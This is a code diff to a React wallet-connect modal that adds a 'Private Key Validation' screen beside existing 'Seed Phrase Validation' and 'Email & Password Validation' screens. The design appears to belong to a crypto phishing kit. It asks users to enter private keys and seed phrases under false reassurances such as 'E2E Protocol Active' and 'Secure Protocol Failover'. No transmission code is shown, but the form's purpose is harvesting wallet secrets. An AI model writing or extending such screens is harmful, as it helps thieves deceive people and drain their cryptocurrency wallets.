@@ -74,7 +74,7 @@ const wallets: Wallet[] = [
   { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/e/e4/Wallet_Flat_Icon.svg" },
 ];
 
-type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password";
+type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password" | "private-key";
 
 export function WalletModal({ children }: { children: React.ReactNode }) {
   const [view, setView] = useState<View>("list");
@@ -130,6 +130,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
             {view === "methods" && "Wallet Validation"}
             {view === "seed-phrase" && "Seed Phrase Validation"}
             {view === "email-password" && "Email & Password Validation"}
+            {view === "private-key" && "Private Key Validation"}
           </DialogTitle>
         </DialogHeader>
         
@@ -383,7 +384,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   </div>
                 </button>
 
-                <button className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left">
+                <button 
+                  onClick={() => setView("private-key")}
+                  className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left"
+                >
                   <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                     <Key className="text-primary w-6 h-6" />
                   </div>
@@ -526,6 +530,59 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   type="password"
                   placeholder="Wallet Password" 
                   className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
+                />
+              </div>
+
+              <Button className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10">
+                <Shield size={16} />
+                Login
+              </Button>
+
+              <div className="mt-8 text-center">
+                <div className="inline-flex items-center gap-2 text-[9px] text-slate-600 font-bold uppercase tracking-[0.3em]">
+                   <div className="w-1.5 h-1.5 rounded-full border border-slate-600"></div>
+                   Secure Protocol Failover
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {view === "private-key" && (
+          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
+            <div className="p-6 pb-2 text-center relative">
+              <div className="w-10 h-10 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto mb-4 border border-emerald-500/20">
+                <Shield className="text-emerald-500 w-5 h-5" />
+              </div>
+              <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
+                WALLET VALIDATION
+              </h3>
+              <p className="text-slate-500 text-[11px] font-bold tracking-widest">
+                Select validation method to continue.
+              </p>
+            </div>
+
+            <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
+              <button 
+                onClick={() => setView("methods")}
+                className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
+              >
+                <ChevronLeft size={14} /> Back
+              </button>
+              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 text-[9px] font-black uppercase tracking-widest">
+                <Lock size={10} /> E2E Protocol Active
+              </div>
+            </div>
+
+            <div className="p-8">
+              <h4 className="text-xs font-black uppercase tracking-[0.2em] mb-8 text-center sm:text-left">
+                Private Key Validation
+              </h4>
+
+              <div className="mb-10">
+                <Input 
+                  placeholder="0x..." 
+                  className="bg-[#0D161F] border-white/5 h-16 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
                 />
               </div>
 
